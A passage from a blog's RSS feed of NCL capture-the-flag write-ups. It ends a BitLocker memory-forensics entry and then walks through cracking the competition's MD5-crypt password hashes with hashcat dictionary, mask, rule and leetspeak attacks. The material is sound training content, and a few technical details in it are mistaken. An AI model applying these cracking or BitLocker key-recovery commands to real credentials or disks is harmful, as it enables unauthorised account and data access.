<li>python2 vol.py -f .mem bitlocker &ndash;profile={profleAbove} &ndash;dislocker</li>
<li>You&rsquo;ll get .fvek files to use with dislocker, which you can refer to Bitlocker-1 for how to decode and mount file
<ol>
<li>insteadd of &ndash;user-password, use &ndash;kvek=</li>
</ol>
</li>
<li>Flag is stored in first level of mount
5b6ff64e4a0ee8f89050b7ba532f6256
60be5ce2a190dfb760bea1ece40e4223c8982aecfd03221a5a43d8fdd302eaee
1ed2a4b8dd0290f646ded074fbcff8bd
bccaf1d4ea09e91f976bf94569761654</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>NCL / Password Cracking [complexity]</title>
      <link>https://alvintran.net/writeups/ncl/pc_complexity/</link>
      <pubDate>Tue, 12 Nov 2024 12:28:45 -0500</pubDate>
      
      <guid>https://alvintran.net/writeups/ncl/pc_complexity/</guid>
      <description>Walkthrough of Fall 2024 NCL Password Cracking (Hard)! Going through basic &lt;code&gt;hashcat&lt;/code&gt; to adding rules to match with complexity requirements</description>
      <content:encoded><![CDATA[<h1 id="prerequisites">Prerequisites</h1>
<ul>
<li>Probably have <a href="https://github.com/hashcat/hashcat">hashcat</a> installed. I have it on some local directory on my Windows PC</li>
<li>Figure out your hash type <a href="https://nth.skerritt.blog/">NameThatHash</a>. Usually for these its md5 (-m 500, is also default on hashcat but having it on makes it faster.)</li>
</ul>
<h1 id="loading-passwords">Loading passwords</h1>
<p>Load the first two hashes (Easy) into a txt file like. Say the file is easy.txt, should just look like:</p>
<pre tabindex="0"><code>$1$abcd$cM9oWl3gP.t.Cz2dWWm7L1
$1$efgh$Fmv8YRcVm3phgfR0MwVYw0
$1$lmno$mDFxTnfk0Ad3di11sVbNj.
</code></pre><p>For taxonomoy:</p>
<pre tabindex="0"><code>$1$ -&gt; Transaction ID ( i think )
$abcd$ -&gt; Salt (prepended/appended to a password before feeding. Make it longer to password crack.
  Example: &#34;password&#34; is actually used for all 3 above, but salt makes them all different. &lt;br&gt;
  Thus if you wanted to crack &#34;password&#34;, you&#39;d have to try 3x as many combinatons.
$restofthestuff -&gt; actual password hash
</code></pre><p>Command to generate: <code>openssl passwd -aixmd5 -salt abcd password</code>. Added <code>$1$</code> to front later.
I keep the real passwords out per NCL guidelines.</p>
<h1 id="easy-passwords-1-2">Easy (passwords 1-2)</h1>
<p><code>hashcat.exe -m 500 easy.txt -a 0 path/to/rockyou.txt</code><br>
-m 500 -&gt; Mode for md5. Usually what they use for these problems, check NameThatHash.<br>
-a 0 -&gt; attack mode 0, dictonary attack. This is default I think as well. Goes through wordlist(s).<br>
Format is generally &ldquo;hashcat.exe [hashfile] [options] [dict1] [dict2] [dict&hellip;]</p>
<p>If you read the problem, the password-maker is <em>really</em> lazy and keeps the same pattern for all his passwords!(ex. password12 and 44password)<br>
They also use the <em>bare minimum</em> number of characters required. Useful to limit your search.<br>
Now we have the keyword, we can start using more complex rules</p>
<h1 id="medium-categories-mask-passwords-3-4">Medium Categories (Mask) (passwords 3-4)</h1>
<p>Assuming hash file is in &lsquo;medium.txt&rsquo;.<br>
This time they&rsquo;ve updated their game and require 2 of:</p>
<ul>
<li>Uppercase</li>
<li>Lowercase</li>
<li>Number
Luckily there two functions of hashcat that can help: mask attack and rules.
I would refer to official hashcat documentation on details but I&rsquo;m here to just run you down to do the problem.</li>
</ul>
<h2 id="mask-attacks">Mask Attacks</h2>
<p>With attack mode <code>-a 6</code> or <code>a -7</code>, you can try characters at end or beginning of a password.</p>
<table>
  <thead>
      <tr>
          <th>option</th>
          <th>characters</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>?d</td>
          <td>0123&hellip;9</td>
      </tr>
      <tr>
          <td>?l</td>
          <td>abcd&hellip;z</td>
      </tr>
      <tr>
          <td>?u</td>
          <td>ABCD&hellip;Z</td>
      </tr>
      <tr>
          <td>?a</td>
          <td>01..9..AB..Z..ab..z..?!&lt;&gt;*$&hellip;~</td>
      </tr>
  </tbody>
</table>
<p>So for example, say we have a file named <code>password.txt</code> that only contains:</p>
<pre tabindex="0"><code>password
PASSWORD
</code></pre><p>We can run <code>hashcat.exe -m 500 medium.txt -a 6 password.txt ?d?d</code> which will do <code>password11 -&gt; password99</code> and <code>PASSWORD11 -&gt; PASSWORD99</code>.<br>
We can reverse this with  <code>hashcat.exe -m 500 medium.txt -a 7 ?d?d password.txt</code>, which <em>prepends</em> to beginning of word i.e <code>12password</code> and so on.<br>
If you&rsquo;d like to combine categories, i.e. both digits and uppercase, we can assign custom codes with <code>-1 ?d?u</code> then instead we insert <code>password.txt ?1?1</code>.<br>
Everything behind <code>-1</code> gets added to a charcter list, so if you wanted only a certain set you could define it as <code>-1 ABCD1234</code> which will only try those 8 characters in any <code>?1</code> space.</p>
<h2 id="rules">Rules</h2>
<p>Can only be used with dictionary attacks (according to my machine, the wiki says something different). Does a lot of fancy things, like substitutions, duplications, case-toggles, etc, really over my head.<br>
Good ones to know:
<a href="https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule">OneRuleToRuleThemAll</a> and its <a href="https://github.com/stealthsploit/OneRuleToRuleThemStill">brother</a>
Base hashcat rules: <code>rules/toggles1.rule</code> - <code>rules/toggles5.rule</code>,   <code>rules/leetspeak.rule</code></p>
<p>ORtRTA (?) takes long time but is mostly thourough, don&rsquo;t do unless you have lotta time.<br>
Toggle rules are easy and work really good for our next case (Medium+).<br>
Leetspeak will work with when NCL adds specifciation &ldquo;Passwords must not contain any word from english dictionary&rdquo;.</p>
<h2 id="solving-the-problem">Solving the problem</h2>
<p>I think I got it trying the ones below and masking sure <code>password.txt</code> had an uppercase KEYWORD and lowercase keyword:</p>
<pre tabindex="0"><code>hashcat.exe -m 500 medium.txt -a 6 -1 ?d?u?l password.txt ?1?1  
hashcat.exe -m 500 medium.txt -a 7 -1 ?d?u?l ?1?1 password.txt
</code></pre><p>Note_1: The amount of <code>?a</code> I add is depndent on minimum length and keyword length. They keyword itself was 6 characters so if the minimum was 10, I would add 4 <code>?d</code> to end like above.<br>
Note_2: Using custom <code>?d?u?l</code> since <code>?1</code> includes special characters which we won&rsquo;t use (problem states bare minimum safe to assume usually).
I was missing one from this category :(</p>
<h3 id="addendum-mask-on-front-and-back">Addendum: Mask on front and back</h3>
<p>Unforunately, you can&rsquo;t put both at front and end at same time, so we have to do it one at a time. hashcat allows for outputting your combinations to a file, so the sequence below would do it:</p>
<pre tabindex="0"><code>hashcat.exe  --stdout -a 6 password.txt ?a  &gt; back.txt
hashcat.exe -m 500 medium.txt -a 7 ?a back.txt
</code></pre><p>This will try <code>1password1</code> all the way to <code>ZpasswordZ</code>. This could get the last one I&rsquo;m missing. Also note for brevity I use <code>?a</code> here instead of the custom.
You can chain and combine different attack modes as well, like if I wanted to combine two wordlists <code>-a 1 first.name last.name &gt; full.name</code> then do my append <code>-a 6 full.name ?d?d</code>. Not necessary here, but good to know.</p>
<h1 id="medium-categories-rules-passwords-5-6">Medium+ Categories+ (Rules) (passwords 5-6)</h1>
<p>NCL now wants the passwords to have ALL of the categories, and a minimum length of 10.<br>
To get all the categories, I did something similar above and used hashcat rules to ALL capitalizations of my kEyWOrd:<br>
<code>hashcat.exe  --stdout -a 0 password.txt -r rules/toggles5.rule  &gt; all.txt</code> (or type it by hand)<br>
Then I just ran what I basically did before but at a larger minimum:</p>
<pre tabindex="0"><code>hashcat.exe -m 500 medium.txt -a 6 all.txt ?d?d?d?d  
hashcat.exe -m 500 medium.txt -a 7 ?d?d?d?d all.txt
</code></pre><p>I try digits first since the <code>all.txt</code> fulfills upper and lowercase already AND its faster to check. This alone got 2 passwords so safe bet. Otherwise you can use <code>-1 ?d?u?l</code> or whatever.</p>
<p>Got the one easy enough.</p>
<h1 id="hard-no-english-password-7">Hard No English (password 7)</h1>
<p>I just took everything from above and threw a rule on it since we can&rsquo;t have &ldquo;english&rdquo; but we can certainly have &ldquo;3ng1!sh&rdquo;</p>
<pre tabindex="0"><code>hashcat.exe --stdout -a 6 all.txt ?d?d?d?d &gt; back.txt
hashcat.exe --stdout -a 7 ?d?d?d?d all.txt &gt; front.txt
hashcat.exe -m 500 hard.txt -a 6 back.txt -r rules/leetspeak.rule
hashcat.exe -m 500 hard.txt -a 6 front.txt -r rules/leetspeak.rule
OR
hashcat.exe -m 500 hard.txt -a 6 front.txt back.txt -r rules/leetspeak.rule
</code></pre><p>I got my one and out. Happened to be in format <code>?d?d?d?dK3yW0rD</code></p>
<h1 id="hardest-passwords-7">Hardest (passwords 7+)</h1>
<p>I did not get to these but I think its combination of above plus:</p>
<ul>
<li>including special characters (leetspeek and ?a or ?s will w ork)</li>
<li>higher minimum number (12)
I hear this is where it gets computationally prohibitive, so will take a while to try different orders and combinations.</li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
